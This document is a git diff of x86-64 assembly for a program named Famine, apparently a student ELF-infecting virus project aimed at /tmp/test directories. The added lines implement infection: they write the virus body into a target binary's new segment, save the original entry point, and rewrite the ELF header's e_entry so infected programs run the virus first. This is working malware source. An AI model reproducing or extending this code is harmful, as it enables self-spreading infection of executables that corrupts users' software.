@@ -1,17 +1,20 @@
 %include "inc/famine.inc"
 
 default rel
-
+section .pollas
+    holi db "kk",0
 section .text
     ; Trazas
-    hello db            "[+] Hello",10,0  ;11
     dir db              "[+] dir",10,0  ;9
 
     global _start
     dirs db         "/tmp/test",0,"/tmp/test2",0,0
+    ; _host:
+    ;     mov rax, SC_EXIT
+    ;     syscall
 
     _start:
-
+    TRACE_TEXT hello, 11
     ; this trick allows us to access Famine members using the VAR macro
     mov rbp, rsp
     sub rbp, Famine_size            ; allocate Famine struct on stack
@@ -288,6 +291,7 @@ section .text
                     ALIGN rcx
                     mov [rax+Elf64_Phdr.p_vaddr], rcx        ; p_vaddr = ALIGN(max_pvaddr_len)
                     mov [rax+Elf64_Phdr.p_paddr], rcx        ; p_paddr = p_vaddr
+                    mov VAR(Famine.new_entry), rcx
 
                     mov ecx, dword VAR(Famine.virus_size)
                     mov [rax+Elf64_Phdr.p_filesz], rcx       ; p_filesz = virus_size
@@ -303,6 +307,13 @@ section .text
                     mov ecx, dword VAR(Famine.virus_size)
                     cld
                     rep movsb
+                    mov rax, VAR(Famine.original_entry)
+                    lea rbx, [rdi - 8]
+                    mov [rbx], rax
+                    mov rax, VAR(Famine.mmap_ptr)
+                    add rax, Elf64_Ehdr.e_entry
+                    mov rbx, VAR(Famine.new_entry)
+                    mov [rax], rbx
 
                 .munmap:
                     ;munmap(map_ptr, )
@@ -314,7 +325,7 @@ section .text
                     ; cambiar tamaños
                     ; lo que sea
 
-            .close_file:
+                .close_file:
                 ; TODO llamar al munmap antes de cerrar el fd.
                 mov rdi, VAR(Famine.fd_file)
                 mov rax, SC_CLOSE
@@ -349,10 +360,15 @@ section .text
             cmp byte [rdi], 0   ; find double null
             jnz .open_dir
 
+        ; .jump:
+        ;     mov rax, [host_entry]
+        ;     jmp rax
+
         .exit:
             mov rax, SC_EXIT
             syscall
 
     Traza db         "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
-
+    hello db            "[+] Hello",10,0  ;11
+    ;host_entry  dq   _host  
     _finish:
